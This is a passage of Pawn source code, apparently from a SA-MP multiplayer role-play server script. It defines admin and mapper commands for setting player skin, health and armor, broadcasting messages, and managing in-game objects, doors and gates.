           format(ADMINMOTD, sizeof(ADMINMOTD), "%s", motd);
       	   format(string, sizeof(string), "AdminWarning: %s has changed the administrator motd to %s.", GetName(playerid), motd);
           SendAdminMessage(COLOR_ADMWARN,  string);
   	   }
   	   Log("Log/Admins/motd.log", string);
   	}
   	else
   	{
	   NoAuth(playerid);
	}
    return 1;
}

IRP:setskin(playerid, var[])
{
	new skin, user, string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2)
	{
        if(sscanf(var, "ui", user, skin)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /setskin [playerid] [skinid]");
	    if(skin > 311 || skin < 1) return SendClientMessage(playerid, COLOR_GRAD2, "* You've entered an invalid skin ID.");
	    if(!Logged(user)) return NoLoginB(playerid);
        SetPlayerSkin(user, skin);
        Player[playerid][pModel] = skin;
        format(string, sizeof(string), "* Your skin has been set to %d by %s", skin, GetName(playerid));
    	SendClientMessage(user, COLOR_WHITE, string);
    	format(string, sizeof(string), "AdminWarning: %s's skin has been set to %d by %s.", GetName(user), skin, GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/setskin.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:sethp(playerid, var[])
{
	new user, hp, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
	{
    	if(sscanf(var, "ui", user, hp)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sethp [playerid] [amount]");
        if(!Logged(user)) return NoLoginB(playerid);
        SetPlayerHealth(user, hp);
        format(string, sizeof(string), "* Your health has been set to %d by %s", hp, GetName(playerid));
    	SendClientMessage(user, COLOR_WHITE, string);
    	format(string, sizeof(string), "AdminWarning: %s's health has been set to %d by %s.", GetName(user), hp, GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/heal.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
    return 1;
}

IRP:setarmor(playerid, var[])
{
	new user, armor, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
	{
    	if(sscanf(var, "ui", user, armor)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /setarmor [playerid] [amount]");
        if(!Logged(user)) return NoLoginB(playerid);
        SetPlayerArmour(user, armor);
        format(string, sizeof(string), "* Your armor has been set to %d by %s", armor, GetName(playerid));
    	SendClientMessage(user, COLOR_WHITE, string);
    	format(string, sizeof(string), "AdminWarning: %s's armor has been set to %d by %s.", GetName(user), armor, GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/heal.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
    return 1;
}

IRP:cnn(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
	{
       if(sscanf(var, "s[256]", string)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /cnn [text]");
       format(string, sizeof(string), "%s", string);
       GameTextForAll(string, 10000, 5);
       Log("Log/Admins/cnn.log", string);
    }
    return 1;
}
IRP:cnnn(playerid, var[])
{
	if(Player[playerid][pAdmin] >= 4)
	{
		new iTextID, Message[128];

		if(sscanf(var, "is[128]", iTextID, Message))
		{
			SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /cnnn [type 1-6] [message]. ~n~ = new line, ~r~ = red, ~g~ = green, ~b~ = blue, ~w~ = white, ~y~ = yellow.");
		}
		else if(!(0 <= iTextID <= 6 && iTextID != 2))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Text ID must be between 0 and 6.");
		}
		else foreach(Player, i) GameTextForPlayer(i, Message, 5000, iTextID);
		Log("Log/Admins/cnnn.log", Message);
	}
	else
	{
    	NoAuth(playerid);
    }
	return 1;
}
IRP:editobject(playerid, var[])
{
	new string[128], idx;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pMapper]) return NoAuth(playerid);
 	if(sscanf(var, "s[128]", var))
	{
	    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editobject [option] [objectid]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS] object | position");
		return 1;
	}
	if(!strcmp(var, "object", true, 5))
	{
	    new object;
	    if(sscanf(var, "s[128]ii", var, idx, object)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /objedit object [objectid] [new objectid]");
        if(!ObjectInfo[idx][oModel]) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid object id.");
        if(object == 0)
		{
			format(string, sizeof(string), "%d", object);
			i_deleteobject(playerid, string);
			return 1;
		}
		ObjectInfo[idx][oModel] = object;
		DestroyDynamicObject(ObjectInfo[idx][obj]);
		ObjectInfo[idx][obj] = CreateDynamicObject(ObjectInfo[idx][oModel], ObjectInfo[idx][oX], ObjectInfo[idx][oY], ObjectInfo[idx][oZ], ObjectInfo[idx][oRX], ObjectInfo[idx][oRY], ObjectInfo[idx][oRZ]);
	    format(string, sizeof(string), " You have set object ID %d's object ID to %d.", idx, object);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	}
	else if(!strcmp(var, "position", true, 5))
	{
	    if(sscanf(var, "s[128]i", var, idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /objedit position [objectid]");
        if(!ObjectInfo[idx][oModel]) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid object id.");
		oEdit[playerid] = 1;
		oEditID[playerid] = idx;
		GetDynamicObjectPos(ObjectInfo[idx][obj], oPos[playerid][0], oPos[playerid][1], oPos[playerid][2]);
		GetDynamicObjectRot(ObjectInfo[idx][obj], oRot[playerid][0], oRot[playerid][1], oRot[playerid][2]);
		EditDynamicObject(playerid, ObjectInfo[idx][obj]);
	    format(string, sizeof(string), " You are now editing object ID %d's position.", idx);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	}
	return 1;
}

IRP:gotoobject(playerid, var[])
{
    new idx, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pMapper]) return NoAuth(playerid);
	if(sscanf(var, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /gotoobject [objectid]");
	if(!ObjectInfo[idx][oModel]) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid object id.");
	SetPlayerPos(playerid, ObjectInfo[idx][oX], ObjectInfo[idx][oY], ObjectInfo[idx][oZ]);
	format(string, sizeof(string), "* You have teleported to object ID %d.", idx);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}
IRP:nearobject(playerid, var[])
{
    new string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pMapper] < 1) return NoAuth(playerid);
    for(new idx=1; idx<MAX_COBJECTS; idx++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3, ObjectInfo[idx][oX], ObjectInfo[idx][oY], ObjectInfo[idx][oZ]))
		{
		    format(string, sizeof(string), "Nearest Object ID: %d", idx);
		    SendClientMessage(playerid, COLOR_PINK, string);
		    return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GRAD2, "You are not near an object!");
	return 1;
}
IRP:deleteobject(playerid, var[])
{
	new idx, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pMapper]) return NoAuth(playerid);
	if(sscanf(var, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deleteobject [objid]");
	if(!ObjectInfo[idx][oModel]) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid object id.");
	ObjectInfo[idx][oModel] = 0;
	ObjectInfo[idx][oX] = 0;
	ObjectInfo[idx][oY] = 0;
	ObjectInfo[idx][oZ] = 0;
	ObjectInfo[idx][oRX] = 0;
	ObjectInfo[idx][oRY] = 0;
	ObjectInfo[idx][oRZ] = 0;
	DestroyDynamicObject(ObjectInfo[idx][obj]);
	DestroyDynamic3DTextLabel(ObjectInfo[idx][oText]);
	format(string, sizeof(string), "AdminWarning: %s has deleted object ID %d.", GetName(playerid), idx);
    SendAdminMessage(COLOR_ADMWARN, string);
	Log("Log/Admins/cobjects.log", string);
	return 1;
}

IRP:createobject(playerid, var[])
{
	new string[128], object;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pMapper]) return NoAuth(playerid);
	if(sscanf(var, "i", object)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /createobject [objectid]");
	for(new idx=1; idx<MAX_COBJECTS; idx++)
	{
	    if(!ObjectInfo[idx][oModel])
	    {
	        GetPlayerPos(playerid, ObjectInfo[idx][oX], ObjectInfo[idx][oY], ObjectInfo[idx][oZ]);
  			ObjectInfo[idx][oModel] = object;
  			oldoID = ObjectInfo[idx][oModel];
			ObjectInfo[idx][oX] = ObjectInfo[idx][oX] + 2;
			ObjectInfo[idx][oY] = ObjectInfo[idx][oY] + 2;
			ObjectInfo[idx][oRX] = 0;
			ObjectInfo[idx][oRY] = 0;
			ObjectInfo[idx][oRZ] = 0;
			// Creating
			ObjectInfo[idx][obj] = CreateDynamicObject(ObjectInfo[idx][oModel], ObjectInfo[idx][oX], ObjectInfo[idx][oY], ObjectInfo[idx][oZ], ObjectInfo[idx][oRX], ObjectInfo[idx][oRY], ObjectInfo[idx][oRZ]);
			//O-bjectInfo[idx][oText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, ObjectInfo[idx][oX], ObjectInfo[idx][oY], ObjectInfo[idx][oZ], 10);
			// Text
			format(string, sizeof(string), "AdminWarning: %s has created object ID %d. (Object: %d)", GetName(playerid), idx, object);
		    SendAdminMessage(COLOR_ADMWARN, string);
			Log("Log/Admins/cobjects.log", string);
			idx = MAX_COBJECTS;
		}
	}
	return 1;
}
IRP:duplicate(playerid, var[])
{
    new string[128] ,idx;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pMapper]) return NoAuth(playerid);
	SendClientMessage(playerid, COLOR_WHITE, "* You duplicated the last object that was created.");
		for(idx=1; idx<MAX_COBJECTS; idx++)
		{
		    if(!ObjectInfo[idx][oModel])
		    {
				ObjectInfo[idx][oModel] = oldoID;
				ObjectInfo[idx][oX] = dX;
				ObjectInfo[idx][oY] = dY;
				ObjectInfo[idx][oZ] = dZ;
				ObjectInfo[idx][oRX] = dRX;
				ObjectInfo[idx][oRY] = dRY;
				ObjectInfo[idx][oRZ] = dRZ;
				// Creating
				ObjectInfo[idx][obj] = CreateDynamicObject(ObjectInfo[idx][oModel], dX, dY, dZ, dRX, dRY, dRZ);
				ObjectInfo[idx][oText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, dX, dY, dZ, 10);
				// Text
				format(string, sizeof(string), "AdminWarning: %s has created object ID %d. (Object: %d)", GetName(playerid), idx, oldoID);
			    SendAdminMessage(COLOR_ADMWARN, string);
				Log("Log/Admins/cobjects.log", string);
				idx = MAX_COBJECTS;
			}
		}
	return 1;
}
IRP:apropertyhelp(playerid, var[])
{
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
		SendClientMessage(playerid, COLOR_ADMCHAT, "** Business Commands: {FFFFFF}/createbiz /deletebiz /gotobiz /editbiz /getbizid /asellbiz /bizused");
		SendClientMessage(playerid, COLOR_ADMCHAT, "** House Commands; {FFFFFF}/createhouse /deletehouse /gotohouse /edithouse /gethouseid /asellhouse /houseused");
		SendClientMessage(playerid, COLOR_ADMCHAT, "** Garage Commands: {FFFFFF}/creategarage /deletegarage /gotogarage /editgarage /getgarageid /garageused");
		SendClientMessage(playerid, COLOR_ADMCHAT, "** Gate Commands: {FFFFFF}/creategate /deletegate /gotogate /editgate /getgateid /gateused /makegateowner");
		SendClientMessage(playerid, COLOR_ADMCHAT, "** Door Commands: {FFFFFF}/createdoor /deletedoor /gotodoor /editdoor /doorused /getdoorid");
	}
	else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:getdoorid(playerid, var[])
{
    new string[256];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
    for(new idx=1; idx<MAX_DOORS; idx++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3, DoorInfo[idx][dOX], DoorInfo[idx][dOY], DoorInfo[idx][dOZ]))
		{
		    format(string, sizeof(string), "Door ID: %d", idx);
		    SendClientMessage(playerid, COLOR_SCRIPTER, string);
		    return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GRAD2, "You are not near a door.");
	return 1;
}
IRP:doorused(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	SendClientMessage(playerid, COLOR_ORANGE, "[Used Doors]:");
	for(new idx=0; idx<MAX_DOORS; idx++)
	{
	    if(DoorInfo[idx][dType])
	    {
			format(string, sizeof(string), "* ID: %d | Pickup: %d | Int: %d | VW: %d | Custom Int: %d | Custom Ext: %d | %s", idx, DoorInfo[idx][dType], DoorInfo[idx][dOInt], DoorInfo[idx][dOVW], DoorInfo[idx][dCInt], DoorInfo[idx][dCExt], DoorInfo[idx][dText]);
			SendClientMessage(playerid, COLOR_WHITE, string);
	    }
	}
	return 1;
}

IRP:editdoor(playerid, var[])
{
	new idx, text[128], string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(sscanf(var, "s[128]", var))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /dedit [option] [doorid]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [Options]: Pickup | Text | Interior | Exterior | CustomInterior | CustomExterior");
		return 1;
	}
	if(!strcmp(var, "pickup", true, 6))
	{
	    new pickup;
	    if(sscanf(var, "s[128]ii", var, idx, pickup)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /dedit pickup [doorid] [pickupid]");
        if(DoorInfo[idx][dType] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid door id.");
		DoorInfo[idx][dType] = pickup;
		if(IsValidDynamicPickup(DoorInfo[idx][dPickup]))
		{
		    DestroyDynamicPickup(DoorInfo[idx][dPickup]);
		}
		DoorInfo[idx][dPickup] = CreateDynamicPickup(DoorInfo[idx][dType], 1, DoorInfo[idx][dOX], DoorInfo[idx][dOY], DoorInfo[idx][dOZ], DoorInfo[idx][dOVW], DoorInfo[idx][dOInt]);
	    format(string, sizeof(string), " You have set door ID %d's pickup to %d", idx, pickup);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	}
	if(!strcmp(var, "text", true, 4))
	{
	    if(sscanf(var, "s[128]is[128]", var, idx, text)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /dedit text [doorid] [text]");
	    if(AntiAdv(playerid, var)) return 1;
        if(DoorInfo[idx][dType] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid door id.");
		format(DoorInfo[idx][dText], 128, "%s", text);
		format(string, sizeof(string), "ID: %d\n%s", idx, DoorInfo[idx][dText]);
		UpdateDynamic3DTextLabelText(DoorInfo[idx][dTextID], COLOR_WHITE, string);
	    format(string, sizeof(string), " You have set door ID %d's text to %s", idx, text);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	}
	if(!strcmp(var, "interior", true, 8))
	{
	    if(sscanf(var, "s[128]i", var, idx, text)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /dedit interior [doorid]");
        if(DoorInfo[idx][dType] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid door id.");
		DoorInfo[idx][dIInt] = GetPlayerInterior(playerid);
		DoorInfo[idx][dIVW] = GetPlayerVirtualWorld(playerid);
		GetPlayerFacingAngle(playerid, DoorInfo[idx][dIA]);
		GetPlayerPos(playerid, DoorInfo[idx][dIX], DoorInfo[idx][dIY], DoorInfo[idx][dIZ]);
	    format(string, sizeof(string), " You have set door ID %d's interior to your coordinates. (Int: %d | VW: %d)", idx, GetPlayerInterior(playerid), GetPlayerVirtualWorld(playerid));
	    SendClientMessage(playerid, COLOR_WHITE, string);
	}
	if(!strcmp(var, "exterior", true, 8))
	{
	    if(sscanf(var, "s[128]i", var, idx, text)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /dedit interior [doorid]");
        if(DoorInfo[idx][dType] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid door id.");
		DoorInfo[idx][dOInt] = GetPlayerInterior(playerid);
		DoorInfo[idx][dOVW] = GetPlayerVirtualWorld(playerid);
		GetPlayerFacingAngle(playerid, DoorInfo[idx][dOA]);
		GetPlayerPos(playerid, DoorInfo[idx][dOX], DoorInfo[idx][dOY], DoorInfo[idx][dOZ]);
		DestroyDynamicPickup(DoorInfo[idx][dPickup]);
		DoorInfo[idx][dPickup] = CreateDynamicPickup(DoorInfo[idx][dType], 1, DoorInfo[idx][dOX], DoorInfo[idx][dOY], DoorInfo[idx][dOZ], DoorInfo[idx][dOVW], DoorInfo[idx][dOInt]);
		DestroyDynamic3DTextLabel(DoorInfo[idx][dTextID]);
		format(string, sizeof(string), "ID: %d\n%s", idx, DoorInfo[idx][dText]);
		DoorInfo[idx][dTextID] = CreateDynamic3DTextLabel(string, COLOR_WHITE, DoorInfo[idx][dOX], DoorInfo[idx][dOY], DoorInfo[idx][dOZ]+0.3, 15);
	    format(string, sizeof(string), " You have set door ID %d's exterior to your coordinates. (Int: %d | VW: %d)", idx, GetPlayerInterior(playerid), GetPlayerVirtualWorld(playerid));
	    SendClientMessage(playerid, COLOR_WHITE, string);
	}
	if(!strcmp(var, "custominterior", true, 14))
	{
	    if(sscanf(var, "s[128]i", var, idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /dedit custominterior [doorid]");
        if(DoorInfo[idx][dType] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid door id.");
		if(!DoorInfo[idx][dCInt])
		{
			DoorInfo[idx][dCInt] = 1;
		    format(string, sizeof(string), " You have set door ID %d to have a custom interior.", idx, text);
	    }
	    else
	    {
	        DoorInfo[idx][dCInt] = 0;
		    format(string, sizeof(string), " You have set door ID %d to have a normal interior.", idx, text);
	    }
	    SendClientMessage(playerid, COLOR_WHITE, string);
	}
	if(!strcmp(var, "customexterior", true, 14))
	{
	    if(sscanf(var, "s[128]i", var, idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /dedit customexterior [doorid]");
        if(DoorInfo[idx][dType] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid door id.");
		if(!DoorInfo[idx][dCExt])
		{
			DoorInfo[idx][dCExt] = 1;
		    format(string, sizeof(string), " You have set door ID %d to have a custom exterior.", idx, text);
	    }
	    else
	    {
	        DoorInfo[idx][dCExt] = 0;
		    format(string, sizeof(string), " You have set door ID %d to have a normal exterior.", idx, text);
	    }
	    SendClientMessage(playerid, COLOR_WHITE, string);
	}
	return 1;
}

IRP:gotodoor(playerid, var[])
{
    new idx, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(sscanf(var, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /gotodoor [doorid]");
	if(!DoorInfo[idx][dType]) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid door id.");
	SetPlayerInterior(playerid, DoorInfo[idx][dOInt]);
	SetPlayerVirtualWorld(playerid, DoorInfo[idx][dOVW]);
	SetPlayerPos(playerid, DoorInfo[idx][dOX], DoorInfo[idx][dOY], DoorInfo[idx][dOZ]);
	format(string, sizeof(string), "* You have teleported to door ID %d.", idx);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

IRP:deletedoor(playerid, var[])
{
	new idx, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(sscanf(var, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deleteedoor [doorid]");
	if(!DoorInfo[idx][dType]) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid door id.");
	DoorInfo[idx][dType] = 0;
	DoorInfo[idx][dOX] = 0;
	DoorInfo[idx][dOY] = 0;
	DoorInfo[idx][dOZ] = 0;
	DoorInfo[idx][dIX] = 0;
	DoorInfo[idx][dIY] = 0;
	DoorInfo[idx][dIZ] = 0;
	DoorInfo[idx][dOInt] = 0;
	DoorInfo[idx][dOVW] = 0;
	DoorInfo[idx][dIInt] = 0;
	DoorInfo[idx][dIVW] = 0;
	DoorInfo[idx][dCInt] = 0;
	DoorInfo[idx][dCExt] = 0;
	format(DoorInfo[idx][dText], 32, "");
	DestroyDynamicPickup(DoorInfo[idx][dPickup]);
    DestroyDynamic3DTextLabel(DoorInfo[idx][dTextID]);
    format(string, sizeof(string), "AdminWarning: %s has deleted door ID %d.", GetName(playerid), idx);
    SendAdminMessage(COLOR_ADMWARN, string);
	Log("Log/Admins/doors.log", string);
	return 1;
}

IRP:createdoor(playerid, var[])
{
	new string[128], type;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(sscanf(var, "i", type)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /createdoor [pickupid]");
	if(type == 0) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid door type.");
	for(new idx=0; idx<MAX_DOORS; idx++)
	{
	    if(!DoorInfo[idx][dType])
	    {
		    GetPlayerPos(playerid, DoorInfo[idx][dOX], DoorInfo[idx][dOY], DoorInfo[idx][dOZ]);
   		    DoorInfo[idx][dType] = type;
			DoorInfo[idx][dOInt] = GetPlayerInterior(playerid);
			DoorInfo[idx][dOVW] = GetPlayerVirtualWorld(playerid);
			GetPlayerFacingAngle(playerid, DoorInfo[idx][dOA]);
			// Creating the door
            DoorInfo[idx][dPickup] = CreateDynamicPickup(DoorInfo[idx][dType], 1, DoorInfo[idx][dOX], DoorInfo[idx][dOY], DoorInfo[idx][dOZ], DoorInfo[idx][dOVW], DoorInfo[idx][dOInt]);
			format(string, sizeof(string), "ID: %d\n/dedit to set the text", idx);
			DoorInfo[idx][dTextID] = CreateDynamic3DTextLabel(string, COLOR_WHITE, DoorInfo[idx][dOX], DoorInfo[idx][dOY], DoorInfo[idx][dOZ]+0.3, 15);
			format(string, sizeof(string), "AdminWarning: %s has created door ID %d. (Int: %d | VW: %d)", GetName(playerid), idx, DoorInfo[idx][dOInt], DoorInfo[idx][dOVW]);
		    SendAdminMessage(COLOR_ADMWARN, string);
			Log("Log/Admins/doors.log", string);
			idx = MAX_DOORS;
		}
	}
	return 1;
}
IRP:editgate(playerid, var[])
{
	new string[128], idx;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
 	if(sscanf(var, "s[128]", var))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editgate [option] [gateid]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: object | close | open | speed | password");
		return 1;
	}
	if(!strcmp(var, "object", true, 5))
	{
	    new object;
	    if(sscanf(var, "s[128]ii", var, idx, object)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editgate object [gateid] [objectid]");
        if(!GateInfo[idx][gModel]) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid gate id.");
        if(object == 0)
		{
			format(string, sizeof(string), "%d", object);
			//i_deletegate(playerid, string);
			return 1;
		}
		GateInfo[idx][gModel] = object;
		DestroyDynamicObject(GateInfo[idx][gGate]);
		GateInfo[idx][gGate] = CreateDynamicObject(GateInfo[idx][gModel], GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], GateInfo[idx][gCRX], GateInfo[idx][gCRY], GateInfo[idx][gCRZ]);
	    format(string, sizeof(string), "* You have set gate ID %d's object ID to %d.", idx, object);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	    format(string, sizeof(string), "%s has set gate ID %d's object ID to %d.", GetName(playerid), idx, object);
	    SendAdminMessage(COLOR_ADMWARN, string);
	}
	else if(!strcmp(var, "close", true, 5))
	{
	    if(sscanf(var, "s[128]i", var, idx)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editgate position [gateid]");
        if(!GateInfo[idx][gModel]) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid gate id.");
		gEdit[playerid] = 1;
		gEditID[playerid] = idx;
		GetDynamicObjectPos(GateInfo[idx][gGate], gPos[playerid][0], gPos[playerid][1], gPos[playerid][2]);
		GetDynamicObjectRot(GateInfo[idx][gGate], gRot[playerid][0], gRot[playerid][1], gRot[playerid][2]);
		EditDynamicObject(playerid, GateInfo[idx][gGate]);
	    format(string, sizeof(string), "* You are now editing gate ID %d's closing position.", idx);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	    format(string, sizeof(string), "%s is now editing gate ID %d's closing position.", GetName(playerid), idx);
	    SendAdminMessage(COLOR_ADMWARN, string);
	}
	else if(!strcmp(var, "open", true, 4))
	{
	    if(sscanf(var, "s[128]i", var, idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editgate open [gateid]");
        if(!GateInfo[idx][gModel]) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid gate id.");
		gEdit[playerid] = 2;
		gEditID[playerid] = idx;
		GetDynamicObjectPos(GateInfo[idx][gGate], gPos[playerid][0], gPos[playerid][1], gPos[playerid][2]);
		GetDynamicObjectRot(GateInfo[idx][gGate], gRot[playerid][0], gRot[playerid][1], gRot[playerid][2]);
		EditDynamicObject(playerid, GateInfo[idx][gGate]);
	    format(string, sizeof(string), "* You are now editing gate ID %d's opening position.", idx);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	    format(string, sizeof(string), "%s is now editing gate ID %d's opening position.", GetName(playerid), idx);
	    SendAdminMessage(COLOR_ADMWARN, string);
	}
	else if(!strcmp(var, "speed", true, 5))
	{
	    new Float:speed;
	    if(sscanf(var, "s[128]if", var, idx, speed)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editgate open [gateid] [speed]");
        if(!GateInfo[idx][gModel]) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid gate id.");
		GateInfo[idx][gSpeed] = speed;
	    format(string, sizeof(string), "* You have set gate ID %d's moving speed to %f.", idx, speed);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	    format(string, sizeof(string), "%s has set gate ID %d's moving speed to %f.", GetName(playerid), idx, speed);
	    SendAdminMessage(COLOR_ADMWARN, string);
	}
	else if(!strcmp(var, "password", true, 8))
	{
	    new password[256];
	    if(sscanf(var, "s[128]is[256]", var, idx, password)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editgate open [gateid] [password]");
        if(!GateInfo[idx][gModel]) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid gate id.");
		format(GateInfo[idx][gPassword], 256, "%s", password);
	    format(string, sizeof(string), "* You have set gate ID %d's password to {FF6347}%s", idx, password);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	    format(string, sizeof(string), "%s has set gate ID %d's password to {FF6347}%s", GetName(playerid), idx, password);
	    SendAdminMessage(COLOR_ADMWARN, string);
	}
	return 1;
}

IRP:gotogate(playerid, var[])
{
    new idx, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(sscanf(var, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /gotogate [gateid]");
	if(!GateInfo[idx][gModel]) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid gate id.");
	SetPlayerPos(playerid, GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ]);
	format(string, sizeof(string), "* You have teleported to gate ID %d.", idx);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

IRP:gateused(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	SendClientMessage(playerid, COLOR_INT, "[Used Gates]:");
	for(new idx=1; idx<MAX_GATES; idx++)
	{
	    if(GateInfo[idx][gModel])
	    {
			format(string, sizeof(string), "* ID: %d | Gate: %d | Speed: %f | Password: %s", idx, GateInfo[idx][gModel], GateInfo[idx][gSpeed], GateInfo[idx][gPassword]);
			SendClientMessage(playerid, COLOR_WHITE, string);
	    }
	}
	return 1;
}
IRP:makegateowner(playerid, var[])
{
	new user, slot, idx, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(sscanf(var, "uii", user, slot, idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /makegateowner [playerid] [slot(1-3)] [gateid] {AFAFAF}(Gate ID 0 to remove ownership)");
	if(!Logged(user)) return NoLoginB(playerid);
	if(idx > 0 && !GateInfo[idx][gModel] || idx < 0) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid gate id.");
	if(slot < 1 || slot > 3) return SendClientMessage(playerid, COLOR_GRAD2, "Gate slots are between 1 and 3.");
	switch(slot)
	{
	    case 1: Player[user][pGate][0] = idx;
	    case 2: Player[user][pGate][1] = idx;
	    case 3: Player[user][pGate][2] = idx;
	}
	if(idx == 0)
	{
		format(string, sizeof(string), "* Administrator %s removed your gate ownership in slot %d.", GetName(playerid), slot);
		SendClientMessage(user, COLOR_WHITE, string);
		format(string, sizeof(string), "AdminWarning: %s has removed %s's gate ownership in slot %d.", GetName(playerid), GetName(user), slot);
		SendAdminMessage(COLOR_ADMWARN, string);
